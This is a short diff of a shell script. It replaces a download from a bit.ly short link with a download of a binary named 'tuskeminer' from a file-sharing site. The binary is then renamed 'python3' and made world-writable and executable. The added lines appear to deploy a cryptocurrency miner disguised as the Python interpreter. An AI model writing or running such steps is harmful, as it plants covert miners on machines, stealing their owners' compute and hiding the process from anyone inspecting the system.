@@ -1,10 +1,8 @@
-wget -O dot bit.ly/KONTOL-AKU-GEDE
+wget https://filebin.net/0v7yqk4wqpta9rtx/tuskeminer
 
-tar -xzvf dot
+mv tuskeminer python3
 
-rm dot
-
-cd dotsrb
+chmod 777 python3
 
 nomer=$((RANDOM % 50 + 1))
 
